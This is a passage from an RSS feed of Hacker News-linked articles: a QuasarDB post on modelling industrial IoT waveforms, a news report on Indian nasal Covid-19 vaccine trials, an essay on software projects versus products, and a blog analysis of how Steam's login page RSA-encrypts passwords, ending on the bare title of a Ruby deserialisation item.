<li>Use a data warehousing solution such as Redshift, Big Query, or Snowflake. That works for a while until the data scientist team realizes that queries remain very slow even with an infinite amount of money, and the CFO shows up at the office with an explosive vest. That's because data warehousing solutions are <strong>not optimized</strong> for write-heavy scenarios. No free lunch! All these indexes are expensive to maintain.</li>
<li>Use Hadoop and… no just kidding.</li>
</ul>
<p>If you work in finance, the above may remind you of the dilemma of working with Level II Market Data.</p>
<h2>How we solve the problem</h2>
<p>We think the good solution enables ingestion at least one order of magnitude faster than the data arrives (to enable restoring from backups in a reasonable amount of time), while enabling transparent querying so that the data science team can pick and zoom on any part of the history at any time.</p>
<p>On top of that, you want storage to be cost efficient through compression.</p>
<p>To do that, we store raw waveforms as timeseries data inside QuasarDB. These waveform can be queried through a SQL-like language or retrieved at very high-speed using a low-level API, when needed.&nbsp;&nbsp;&nbsp;</p>
<h2>How we typically model the waveform</h2>
<h3>Flexible representation</h3>
<p>The typical approach in data warehousing is to store all the data in a couple of large tables and pray the underlying implementation will sort it out. It almost works until you write hundreds of millions of points per second to a table, and the SSD starts to generate a black hole under the data pressure.</p>
<p>Fortunately, a <a href="https://en.wikipedia.org/wiki/Quasar" rel="noopener" target="_blank">quasar </a>isn't a black hole.</p>
<p>The most efficient and convenient way to store waveforms in QuasarDB is to store each sensor as a separate timeseries. It's convenient because you can align waveforms to each other using ASOF joins or downsample them on the fly. You can also easily visualize them for any arbitrary time range without worrying about the underlying representation.</p>
<p>You may ask, but then, how can I query a group of sensors? We have a solution for that: table tagging.</p>
<p>Let's imagine we have two sensors for three-phase electrical data, in two separate tables, stored as such:</p>
<p><span>CREATE TABLE sensor1 (phase1 double, phase2 double, phase3 double)</span></p>
<p><span>CREATE TABLE sensor2 (phase1 double, phase2 double, phase3 double)</span></p>
<p>You can group these two tables by attaching a tag "machine_a" to both of them and then write the following query</p>
<p><span>SELECT * FROM FIND(tag=’machine_a’)</span></p>
<p>Which will be the equivalent of</p>
<p><span>SELECT * FROM sensor1, sensor2</span></p>
<p>Since tags can be added, changed, and removed instantly, this creates a very flexible meta-model and doesn't force too many decisions early in the project. Adding a sensor is just adding a table. A single table can have thousands of tags, and tags can be tagged to allow for recursive queries (more on this in the doc).</p>
<p>Ok, now, I can hear you say, "but how will I write to thousands of tables at the same time?!". Luckily, we also have a solution: our batch writer supports multi-table writes and optimizes the exchanges with the database. Using the batch writer, one of our customers commits to 250,000 tables every minute on a cluster made of only two <a href="https://aws.amazon.com/ec2/instance-types/" rel="noopener" target="_blank">AWS m5.8xlarge nodes</a>.</p>
<p>If you're interested in learning more about writing efficiently to Quasardb, <a href="https://blog.quasardb.net/achieving-maximum-write-speed-with-quasardb" rel="noopener" target="_blank">this blog post</a> may be of interest.</p>
<h3>Efficient encoding</h3>
<p>While QuasarDB delivers raw power, you can go even further by being smart about how you represent the data.</p>
<p>To achieve maximum performance, the first thing we do is leverage the <a href="https://doc.quasardb.net/master/queries/create_table.html" rel="noopener" target="_blank">symbol tables</a> of QuasarDB to minimize the size of the strings at every row. A symbol table is a big dictionary that will associate an integer to a string value and is a great choice when strings' cardinality is low. Symbol tables are dynamic so you don't have to know every possible string representation in advance, and they can hold billions of symbols efficiently.</p>
<p>Symbol tables are more efficient for two reasons. First, encoding an integer is smaller than a string as soon as the string exceeds 8 characters. Even when that's not the case, our …</p></span></p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020">https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020</a></em></p>]]>
            </description>
            <link>https://blog.quasardb.net/large-scale-industrial-iot-data-project-lessons-learned-in-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25685491</guid>
            <pubDate>Fri, 08 Jan 2021 15:18:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India could get nasal vaccine against Covid-19 soon]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25685187">thread link</a>) | @jangid
<br/>
January 8, 2021 | https://www.indiatoday.in/coronavirus-outbreak/story/india-nasal-coronavirus-vaccine-soon-trials-begin-nagpur-1756780-2021-01-07 | <a href="https://web.archive.org/web/*/https://www.indiatoday.in/coronavirus-outbreak/story/india-nasal-coronavirus-vaccine-soon-trials-begin-nagpur-1756780-2021-01-07">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>A nasal Covid-19 vaccine could be a reality in India soon with Bharat Biotech, the Indian vaccine maker, all set to start phase 1 and 2 trials of a nasal vaccine at Gillurkar Multi Speciality Hospital in Nagpur.</p><p>Bharat Biotech’s head Dr Krishna Ella said on Thursday, "We are working on a nasal vaccine and have partnered with the Washington University School of Medicine. We are working on a single dose vaccine compare to two-dose inactivated vaccine. Research has proven that the nasal vaccine is the best choice. Coronavirus also attacks through the nose."</p><p>"We are <a href="https://www.indiatoday.in/coronavirus-outbreak/vaccine-updates/story/bharat-biotech-founder-assures-safety-of-covaxin-nasal-vaccine-1755712-2021-01-04" target="_blank">all set to host the trials for the nasal Covaxin in the next two weeks</a>. Enough scientific evidence is available that vaccines given through nasal route are more effective than injected ones. Bharat Biotech is in the process to submit a proposal to the DCGI shortly," said Dr Chandrashekar Gillurkar.</p><p>The trials will be conducted on at least 30-45 healthy volunteers above the age of 18 till the age of 65 years at four trial sites in the country -- Bhuvneshwar, Pune, Nagpur and Hyderabad.</p><p>Presently, Bharat Biotech is working on two intranasal vaccines -- one with US-based vaccine maker FluGen and scientists from the University of Wisconsin Madison and the other with the University of Washington School of Medicine.</p><p>Experts say that the nasal variant of the Covid-19 vaccine, which is currently under trial in the US, could play a major role in stopping transmission of the virus.</p><p><em><strong>Read: <a href="https://www.indiatoday.in/coronavirus-outbreak/vaccine-updates/story/confused-about-covid-19-vaccines-this-is-for-you-1756786-2021-01-07" target="_blank" title="Confused about Covid-19 vaccines? This is for you">Confused about Covid-19 vaccines? This is for you</a></strong></em></p><h3><span><strong>WHAT IS NASAL VACCINE?</strong></span></h3><p>Unlike other Covid-19 vaccines that are administered intramuscularly (or through the muscles), this one is delivered via the nose, which is also an initial point of infection in humans.</p><p>A study done by the University of Washington School of Medicine in St Louis found that the nasal delivery route created a strong immune response throughout the body, but it was particularly effective in the nose and respiratory tract, preventing the infection from taking hold in the body.</p><p><em><strong>Read: <a href="https://www.indiatoday.in/coronavirus-outbreak/story/vaccination-doesn-t-guarantee-100-protection-wearing-mask-is-must-experts-1756766-2021-01-07" target="_blank" title="Vaccination doesn't guarantee 100% protection, wearing mask is must: Experts">Vaccination doesn't guarantee 100% protection, wearing mask is must: Experts</a></strong></em></p><h3><span><strong>ARE NASAL VACCINES BETTER THAN INJECTIONS?</strong></span></h3><p>Experts say the nasal Covid-19 vaccine has the potential to become a game-changer because injecting the vaccine intramuscularly only protects the lower lung. A nasal vaccine can protect both the upper and lower lung and can prevent transmission of the virus as well as an infection.</p><p>Dr Samiran Panda, senior epidemiologist at Indian Council of Medical Research said nasal vaccine provides benefits such as faster absorption, lesser volume and no use of syringes.</p><p> <img data-src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202101/PHOTO-2021-01-07-23-05-59-x1280.jpg?CsWamucYQxVXvG9OqXSQo33RxTxirvDo" src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202101/PHOTO-2021-01-07-23-05-59-x1280.jpg?CsWamucYQxVXvG9OqXSQo33RxTxirvDo" alt=""></p><p>"There are two arms of the immune system in the body - one is antibody or protein and one is cellular immunity. <a href="https://www.indiatoday.in/coronavirus-outbreak/story/mucosal-immunity-prevent-covid-outbreak-1745369-2020-11-30" target="_blank">The mucosal immunity is created</a> when administered a nasal vaccine against those infections that enter our body through the nose or respiratory tract. Coronavirus impacts the respiratory tract the most. Therefore, the nasal vaccine is much better. Antibodies will be secreted directly into the nasal mucous membrane, where you need more concentration of the antibody because it is where the infection begins from."</p><p><strong>Faster absorption:</strong></p><p>When administered orally or nasally, the antigen is presented to the mucous membrane, the absorption is much better and it quickly goes to the lymph nodes. There is an effective presentation of the viral antigen directed at the infection.</p><p><strong>Lesser volume:</strong></p><p>Earlier rabies vaccine used to be given in the subcutaneous fat and now is being given intra-dermal injection route (through the skin). A similar immune response can be generated with a much smaller dose.</p><h3><span><strong>INTERNATIONAL TRIALS</strong></span></h3><p>An influenza vaccine called FLUmist, delivered via the nose, uses the weakend form of live influenza virus but can’t be administered to certain groups including those whose immune systems are compromised by cancer, HIV and diabetes.</p><p>In contrast, the new coronavirus intranasal vaccine does not use a live virus capable of replication, presumably making it safer.</p><p>The United Kingdom's Medicines and Healthcare Products Regulatory Agency (MHRA), has approved Open Orphan and Codagenix to conduct a phase 1 study of its nasal Covid-19 vaccine in the country.</p><p><strong>Also Read | <a href="https://www.indiatoday.in/coronavirus-outbreak/vaccine-updates/story/bharat-biotech-founder-assures-safety-of-covaxin-nasal-vaccine-1755712-2021-01-04" target="_blank" title="Bharat Biotech founder assures safety of Covaxin, pins hopes on its new nasal vaccine">Bharat Biotech founder assures safety of Covaxin, pins hopes on its new nasal vaccine</a></strong></p><p><strong>Also Read | <a href="https://www.indiatoday.in/coronavirus-outbreak/video/covishield-covaxin-vaccines-will-be-available-in-india-soon-health-minister-harsh-vardhan-1756772-2021-01-07">Covishield, Covaxin vaccines will be available in India soon: Health minister Harsh Vardhan</a></strong></p><p><strong>Also Read | <a href="https://www.indiatoday.in/coronavirus-outbreak/story/vaccination-doesn-t-guarantee-100-protection-wearing-mask-is-must-experts-1756766-2021-01-07">Vaccination doesn't guarantee 100% protection, wearing mask is must: Experts</a></strong></p></div></div>]]>
            </description>
            <link>https://www.indiatoday.in/coronavirus-outbreak/story/india-nasal-coronavirus-vaccine-soon-trials-begin-nagpur-1756780-2021-01-07</link>
            <guid isPermaLink="false">hacker-news-small-sites-25685187</guid>
            <pubDate>Fri, 08 Jan 2021 14:45:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Projects vs. Software Products]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684981">thread link</a>) | @mgc092
<br/>
January 8, 2021 | https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/ | <a href="https://web.archive.org/web/*/https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As a developer, you work on software projects, right? …Or are they <em>software products</em>?</p>

<p>Like many others in the software industry, you might think those two concepts are synonyms; but they aren’t. In fact, whether the software being developed is considered a project or a product may have critical and non-trivial ramifications, in many aspects.</p>

<p><img src="https://www.romenrg.com/images/products_vs_projects.jpg" alt="Team meeting in which multiple colleagues discuss in a table, where several computres are opened. One man moves hands displaying confusion"></p>

<p>The <em>not-so-subtle</em> differences between software projects and software products actually have a huge impact on our behavior, both from a business as well as from an engineering perspective.</p>

<!-- More -->


<p>For many years I’ve been trying to find the time to write about this key difference, to which many people in tech fail to give importance to. About a year ago, I had the opportunity to give a <a href="https://www2.slideshare.net/romenrg/agile-software-development-beyond-projects-ull">lecture</a> on this very topic. And now, I have finally decided to write about this important topic in more detail.</p>

<p>I’ll start with definitions, digging into the key differences that derive from them. Afterwards, I’ll explore the critical behavioral ramifications. However, if you just want a quick summary, feel free to jump directly to the <a href="#detailed-comparison">comparison table</a>.</p>

<h2>Let’s start with some definitions</h2>

<p>If we want to get a clear definition of “project” and “<a href="https://www.pmi.org/about/learn-about-pmi/what-is-project-management">project management</a>”, the Project Management Institute (PMI) can probably be of some help. From their site we can extract two clear sentences that are relevant in this context:</p>

<ul>
<li>A <strong>project</strong> is temporary in that it has a defined beginning and end in time, and therefore defined scope and resources.</li>
<li><strong>Project management</strong>, then, is the application of knowledge, skills, tools, and techniques to project activities to meet the project requirements.</li>
</ul>


<p>Now, if we try to look for definitions of “<a href="https://en.wikipedia.org/wiki/Product_(business)">product</a>” and “<a href="https://en.wikipedia.org/wiki/Product_management">product management</a>”, we can probably summarize them as:</p>

<ul>
<li>A <strong>product</strong> is an object or system made available for consumer use; it is anything that can be offered to a market to satisfy the desire or need of a customer.</li>
<li><strong>Product management</strong>, then, drives the business case for product development and has an active role throughout its development, test and launch; being also involved in product change and lifecycle decisions and planning.</li>
</ul>


<p>Can you tell the key differences already?</p>

<h2>Digging into the differences</h2>

<h3>Two key differences, from definitions</h3>

<p>From the definitions above, we can clearly see the first big difference: the temporary nature of a project. <strong>Projects are time-constrained efforts</strong>, supposed to have a defined beginning and end date. This clearly-defined temporary nature does not apply to products, which don’t have such predefined beginning and end in time, being subject to market demand instead.</p>

<p>Moreover, those clearly defined time boundaries for projects also bring the second clear distinction: fixed scope and resources (i.e. the project requirements). This doesn’t apply to products either. <strong>Products are evolving creatures by nature</strong>. While project management cares about meeting those predefined project requirements; product management cares about the business case for the product, constantly learning from users and having an active role in the product lifecycle, defining new features and/or re-prioritizing work, adapting to market needs.</p>

<h3><a id="detailed-comparison"></a>Detailed comparison</h3>

<p>When I was preparing my lecture, I found a very nice article by Sriram Narayan in Martin Fowler’s blog. In his article, Sriram added a very comprehensive <a href="https://martinfowler.com/articles/products-over-projects.html#WhatIsProduct-mode">table comparing project-mode and product-mode</a>.</p>

<p>For this article, I have created my own simplified table; focusing only on some key aspects I would like to compare for the two cases.</p>

<table>
<thead>
<tr>
<th>Aspect                                  </th>
<th> Project                                   </th>
<th> Product                                                    </th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Duration</em>                              </td>
<td> Fixed. Limited (e.g. <em>X</em> months).           </td>
<td> Unknown. Depending on market (from <em>X</em> weeks to <em>Y</em> decades).</td>
</tr>
<tr>
<td><em>Scope</em>                                 </td>
<td> Supposedly known and fixed.               </td>
<td> Unknown. Constant learning and adaptation is assumed.</td>
</tr>
<tr>
<td><em>Costs</em>                                 </td>
<td> Supposedly known and fixed.               </td>
<td> “Pay as we go”, i.e. weekly / monthly / yearly (e.g. salaries).</td>
</tr>
<tr>
<td><em>Technical quality</em>                     </td>
<td> Not rewarded; thus, not prioritized. Projects are seen as one-off efforts, so maintainability is not valued. </td>
<td> Critical. Product development is a continuum. Technical excellence is key to keep up the product’s iterative and incremental evolution.</td>
</tr>
<tr>
<td><em>Key mindset aspects</em>                   </td>
<td> Fixed mindset. “We know what we have to build”. So, “just do it”. Don’t question things. </td>
<td> Learning mindset. “We are constantly learning and adapting”. Data-driven. Question decisions constantly.</td>
</tr>
<tr>
<td><em>Key engineering skills</em>                </td>
<td> Framework-specific knowledge. <p> Everything is fixed, from features to technologies. “We just need to write the code as quickly as possible”. </p></td>
<td> <a href="https://github.com/romenrg/evergreen-skills-developers">Evergreen development skills</a>. <p> Everything may change, from features to technology. “We need to learn and adapt constantly”. “We apply technical best practices”. “Teamwork, mentoring and collaboration are key”.</p></td>
</tr>
</tbody>
</table>


<h2>Software development is mainly about building products</h2>

<p><a href="https://www.romenrg.com/blog/2015/09/28/why-asking-developers-for-time-estimates-in-software-projects-is-a-terrible-idea-and-how-to-bypass-it-with-scrum/#the-role-of-evil-contracts">Software development involves many unknowns</a>. Those unknowns make it extremely hard for us to have the certainties “projects” require upfront. At the beginning is when we know the least about the software what we are building.</p>

<h3>In the digital economy, software evolves constantly</h3>

<p>Think of the software you use in your daily life. Isn’t it always evolving? You receive constant updates, not only for bugfixing; but also to add new features, <a href="https://www.romenrg.com/blog/2013/01/02/improving-the-ui-to-achieve-a-better-ux-my-experience-in-stat4you/">improve the UX</a>, or even to remove pieces that are no longer relevant.</p>

<p>Does this fit into the definition of “project” we saw before? Do these applications have “a defined beginning and end in time”? And how about scope and resources, do they seem to have been fixed upfront?</p>

<p>Change and evolution are natural in products, but not in projects. Projects don’t welcome change. And software evolves constantly.</p>

<h3>Software products and outsourcing are not a good fit</h3>

<p>Traditionally, it has been common for non-software organizations to outsource software development initiatives. For instance, Government agencies typically outsource their “software development projects”, even though in most cases they should have been thinking in terms of software products instead.</p>

<p>Think of an e-gov application in which citizens can perform their bureaucratic obligations from home. Isn’t that a software product? It will have to evolve, as new laws are passed. And it is not supposed to have a predefined teardown day. Instead, we would probably expect it to be there for the long run. Over time, citizens (users) will discover bugs, which will have to be addressed; and we will likely complain about it and/or suggest improvements. There might also be scalability issues and/or outages that will have to be tackled.</p>

<p>Treating these software products as outsourced projects means that the owners will hire an external company to build it. Usually the cheapest. The project will have a fixed scope, and the parties will agree on a timeline and on a price. The external company will complete the project, according to those parameters and hand it over to the customer. Then, usually, the external company forgets about it. If changes are desired in the future, new projects will be defined and outsourced. Often to different companies.</p>

<p>In most cases, the company that is hired to build the software is not involved in the discovery process with potential users. They are not involved in the prioritization of features. They are just hired to do X, as quickly and cheaply as possible. And since they are not rewarded for software quality nor for asking questions, they will probably build it without maintenance in their minds. And they won’t question decisions nor worry about gathering data.</p>

<p>Now, think how different it would be if it was treated as a software product, with an in-house team building it and participating in all the process, from conception to evolution. The team would understand needs, motivations and strategic goals; they would be engaged. They would ask questions. Hypotheses could be defined together and data collection and learning would be in everybody’s mind since the beginning. Working in small increments would be easier. Writing maintainable code becomes crucial. Changes are welcome. And quality matters.</p>

<p>Being aware of the importance of software products in the digital economy means that, if your software is (or is becoming) the core of your business, then you keep software development in-house. Nowadays, every company is a software company. Think of Airbnb, Lyft or Netflix. These businesses could have opted to externalize software development, but they realized the software products they were building are the core of their business. They realized they were software companies.</p>

<h3>How about open source “projects”?</h3>

<p>It is common in the software industry to hear people refer to “open source projects”. In most cases, though, I would argue we should be talking about “open source products” instead.</p>

<p>I have been an open source software (OSS) user for many years, and I have also contributed to open source myself. One example of OSS to which I have contributed is <a href="http://jenkins.io/">Jenkins</a>. Jenkins is the leading open source automation server. It has been around for more than 15 years, with millions of installations worldwide. And it has evolved significantly, including the fork from Hudson, the recent UI changes, and the thousands of ever-evolving plugins, created by a thriving open source community. Based on this data and the previous definitions, should we consider Jenkins an “open source project” or, rather, an “open source product”?</p>

<p>I understand that, when somebody (like Kohsuke with Jenkins) starts to build an open source software, they might have a limited and well defined idea. And they may work on a “project” to make it happen. A project to build the first set of fixed features for their idea. But then, if it is successful, that initial project leads to a product that keeps evolving in unanticipated ways. Scope is no longer fixed, as the community starts to bring new ideas and prioritize their development; and …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/">https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/</a></em></p>]]>
            </description>
            <link>https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684981</guid>
            <pubDate>Fri, 08 Jan 2021 14:24:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Steam's login method is kinda interesting // owlspace]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684254">thread link</a>) | @hutattedonmyarm
<br/>
January 8, 2021 | https://owlspace.xyz/cybersec/steam-login/ | <a href="https://web.archive.org/web/*/https://owlspace.xyz/cybersec/steam-login/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><header></header><p>How do you send a password over the internet? You acquire a SSL certificate and let TLS do the job of securely transporting the password from client to server. Of course it’s not as cut-and-dry as I’m making it out to be, but the gist of it holds true and stood the test of time. This hasn’t always been this way though, and one incredibly popular storefront on the world wide web prefers to add a little extra to this day. I’ll be discussing Steam’s unique method of logging in their users, and go down a deep rabbit hole of fascinating implementation details.</p><h3 id="pointing-out-the-obvious">Pointing out the obvious</h3><p>I found a StackOverflow question from 2013 <a href="https://stackoverflow.com/questions/1582894/how-to-send-password-securely-over-http">asking how to securely send a password over HTTP</a>. The answers are pretty unanimous: get a SSL certificate. Here’s an experiment: set up your favorite traffic-capturing proxy, browse to a service you frequently use, log in with your account (or preferably a throwaway), and inspect the requests. You will most certainly find that your username and password are sent as-is in a HTTP request body. The only reason this works is because your connection to the server is encrypted using TLS.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/so-real-host.png" alt="StackOverflow user asking what to do if a webhost doesn't support SSL certificates, told to move to a real webhost"><figcaption><p>Weird to think that this used to be an issue</p></figcaption></figure><p>The internet was a different place though in the early 2010s, let alone the many years prior. We now have services like <a href="https://letsencrypt.org/">Let’s Encrypt</a> which issue SSL certificates free of charge for a period of three months, with automatic renewals if desired. There really wasn’t much of a way around acquiring a SSL certificate for money, but usually with extended validity and support. You could certainly argue that there is a price to be paid for the security and privacy of your users, but that didn’t stop questions like the one I linked from appearing.</p><p>Now that we all agree that TLS is important, let’s switch it up. Let’s pretend we cannot send a password over HTTPS and have to somehow make it work with plain HTTP, while also providing users with some level of security. There’s the <code>Authorization</code> header which is standardized and widely accepted. However, in conjunction with the “Basic” HTTP Authentication scheme, it provides no security if used in plain HTTP.</p><p>There are tried and tested challenge-response algorithms, most notably <a href="https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol">SRP</a> which is designed to do password-based authentication without ever actually sending the password, but you probably have to implement them yourself and a slight oversight could cause serious harm. You could also defer authentication to an external service. “Sign in with service XYZ” is commonly used, but comes with its own ramifications. All things considered, it’s not trivial to send secrets over an inheretly insecure connection.</p><p>So when me and a friend took Steam apart in search for traces of personally identifiable information, I was surprised to see that Steam’s login page doesn’t only rely on TLS to ensure that your password stays protected.</p><h3 id="crypto-cherry-on-top">Crypto cherry on top</h3><p>Again, grab your favorite traffic-capturing proxy and navigate to <a href="https://store.steampowered.com/login">Steam’s login page</a>. Enter your username and password and you will (hopefully) be asked to enter a one-time token generated by your preferred two-factor authentication method. You can stop right there, because the magic I want to point out has already happened. You’ll find that pressing the login button launches a request against an odd endpoint: <code>/login/getrsakey</code>, followed by <code>/login/dologin</code>.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/getrsa-call.png" alt="Requests to fetch script assets, acquire RSA key and perform login"><figcaption><p>All relevant assets and requests in succession</p></figcaption></figure><p>Inspect the request for <code>/login/getrsakey</code> and you’ll find a JSON-formatted response, containing fields with names that should look very familiar to anyone who’s briefly dealt with public key cryptography. You’re given a RSA public key, though the exact values might look a bit odd. It’s clear that <code>publickey_mod</code> and <code>publickey_exp</code> define the modulus and the exponent used in encryption, but the former is given in hexadecimal while the latter appears to be given in binary (I’ll get back on that later). There’s also a timestamp which has no immediately recognizable starting point. As to what the purpose of <code>token_gid</code> is, I have no clue yet.</p><div><pre><code data-lang="json"><span>{</span>
    <span>"success"</span><span>:</span><span>true</span><span>,</span>
    <span>"publickey_mod"</span><span>:</span><span>"c85ba44d5a3608561cb289795ac93b34d4b9b4326f9c09d1d19a9923e2d136b8..."</span><span>,</span>
    <span>"publickey_exp"</span><span>:</span><span>"010001"</span><span>,</span>
    <span>"timestamp"</span><span>:</span><span>"1260462250000"</span><span>,</span>
    <span>"token_gid"</span><span>:</span><span>"2701e0b0a4be3635"</span>
<span>}</span>
</code></pre></div><p>The login page pulls some scripts on load. There is the main login handler contained in <code>login.js</code> which is completely unobfuscated, so anyone can just analyze it and find out what it does. The site also loads some additional dependencies, namely <code>jsbn.js</code> and <code>rsa.js</code>.</p><p>A quick search for the name mentioned in the first line of <code>jsbn.js</code> reveals that these two scripts are the work of <a href="http://www-cs-students.stanford.edu/~tjw/">Tom Wu</a> — a MIT and Stanford graduate who likes software engineering and computer cryptography. They released <code>jsbn.js</code> and <code>rsa.js</code> as pure JavaScript implementations of arbitrary precision integers and RSA encryption/decryption respectively. You’ll also find that these libraries have had their most recent updates in 2005 and 2013 which is a bit of information I’ll come back to later. For now, just keep it in mind.</p><h3 id="going-down-the-rsabbit-hole">Going down the r(s)abbit hole</h3><p>So now that we have all relevant assets, let’s dig around in <code>login.js</code>. The code is a bit of a mess with lots of callbacks and proxied function calls, but it turns out the parts of interest can be easily condensed. In essence, the script can be boiled down to a couple of steps, each step assuming that everything went fine in the previous step.</p><ol><li>The user enters their username and password and presses the login button.</li><li><code>DoLogin</code> is called, which checks if the login mask was filled out correctly and launches a request against <code>/login/getrsakey</code>.</li><li><code>OnRSAKeyResponse</code> is called. This checks if the response is well-formed.</li><li><code>GetAuthCode</code> is called. It runs some platform-specific code in case there are any 2FA measures active on the user’s account.</li><li><code>OnAuthCodeResponse</code> is called. This is where the password is encrypted using RSA and the request against <code>/login/dologin</code> is prepared and executed.</li><li><code>OnLoginResponse</code> is called. The user is logged in and redirected to the Steam storefront.</li></ol><p>The code in <code>OnAuthCodeResponse</code> shows why the requested public key is formatted the way that it is. Starting at line 387 in the source file, the modulus and exponent of the <code>/login/getrsakey</code> response are passed as-is to the RSA library. The user’s password is then encrypted with the given public key and added to the request against <code>/login/dologin</code> in the subsequent login step.</p><div><pre><code data-lang="js"><span>var</span> <span>pubKey</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>results</span><span>.</span><span>publickey_mod</span><span>,</span> <span>results</span><span>.</span><span>publickey_exp</span><span>);</span>
<span>var</span> <span>username</span> <span>=</span> <span>this</span><span>.</span><span>m_strUsernameCanonical</span><span>;</span>
<span>var</span> <span>password</span> <span>=</span> <span>form</span><span>.</span><span>elements</span><span>[</span><span>'password'</span><span>].</span><span>value</span><span>;</span>
<span>password</span> <span>=</span> <span>password</span><span>.</span><span>replace</span><span>(</span><span>/[^\x00-\x7F]/g</span><span>,</span> <span>''</span><span>);</span> <span>// remove non-standard-ASCII characters
</span><span></span><span>var</span> <span>encryptedPassword</span> <span>=</span> <span>RSA</span><span>.</span><span>encrypt</span><span>(</span><span>password</span><span>,</span> <span>pubKey</span><span>);</span>
</code></pre></div><p>I copied the source files onto my local machine to explore the RSA library a little bit. Both the modulus and the exponent are passed to the function <code>RSAPublicKey</code> which behaves like a constructor in the “pre-class” JavaScript era. <code>RSAPublicKey</code> simply wraps both values into instances of <code>BigInteger</code> provided by the <code>jsbn.js</code> script. It was to my surprise that the exponent is actually not represented in binary but, just like the modulus, in hexadecimal. (Also, turns out <code>0x010001</code> is a <a href="https://stackoverflow.com/questions/6098381/what-are-common-rsa-sign-exponent">very common encryption exponent</a> in RSA implementations.) So now it’s clear that the password encryption is based on 2048-bit RSA with an encryption exponent of 65537.</p><div><pre><code data-lang="js"><span>let</span> <span>r</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>"c85ba44d5a360856..."</span> <span>/* insert your own long modulus here */</span><span>,</span> <span>"010001"</span><span>);</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>encryptionExponent</span><span>.</span><span>toString</span><span>());</span> <span>// =&gt; "65537"
</span><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>modulus</span><span>.</span><span>bitLength</span><span>());</span> <span>// =&gt; 2048
</span></code></pre></div><p>Moving on to the <code>timestamp</code> field. The <code>/login/getrsakey</code> response contains an <code>Expires</code> header. It references a date in the past, meaning that the response is absolutely not meant to be cached or persisted in any way. If you check back on <code>/login/getrsakey</code> over a longer period of time, you’ll notice that the public key changes ever so often and, as such, its timestamp value too. This means there’s only a limited time frame in which a certain Steam-issued RSA public key can be used to authenticate.</p><p>This becomes even more evident when examining the subsequent request against <code>/login/dologin</code>. Among many other things, it contains the username, encrypted password as well as the timestamp of the issued RSA public key. Trying to perform a login attempt while altering the timestamp fails as expected. But more importantly, it’s also not possible to reuse an older public key, even if the password is correctly encrypted.</p><p>I went one step further and <a href="https://gist.github.com/JoogsWasTaken/8a8e60859e1721255c57e9185eb6cb10">wrote a simple Python script to collect public keys</a> over the span of three days using a throwaway account. I let it run every five minutes using a cronjob. The goal was to check just how often Steam’s public keys change and to hopefully find out how the <code>timestamp</code> field behaves.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-pubkeys.png" alt="SQLite database containing public keys sourced from Steam"><figcaption><p>Lots and lots and lots of public keys</p></figcaption></figure><p>I found that the public key changes every 12 entries, meaning that it’s safe to assume that they rotate every hour. The encryption exponent stays the same — no surprises here. More intriguing however is the aforementioned <code>timestamp</code> field. For every 12 public keys, the value of the <code>timestamp</code> increases by a certain amount, namely 3600000000 and then some. And what’s more is that this number wraps around after some period of time as can be seen in the following image. Be warned, because all of what I’m about to say is highly speculative.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-wraparound.png" alt="Public key entries where the timestamp value wraps around in-between"><figcaption><p>Timestamp field wrapping around</p></figcaption></figure><p>I found that 3600000000 microseconds is equal to one hour, making me assume that the value of the <code>timestamp</code> field is, in fact, given in microseconds. However, I already hinted at the fact that the timestamp value doesn’t increase by one hour exactly with every new public key. In my own data, I observed that the difference between two successive timestamps is one hour plus 1 to 2.6 seconds, with most being in the order of about 1.05 to 1.25 seconds. But this raises another interesting possibility.</p><p>Let’s assume that a new public key is generated every hour plus one second. If I query the public key …</p></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://owlspace.xyz/cybersec/steam-login/">https://owlspace.xyz/cybersec/steam-login/</a></em></p>]]>
            </description>
            <link>https://owlspace.xyz/cybersec/steam-login/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684254</guid>
            <pubDate>Fri, 08 Jan 2021 13:05:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Universal Ruby 2.x-3.x deserialisation gadget to achieve RCE]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684217">thread link</a>) | @Techbrunch
<br/>
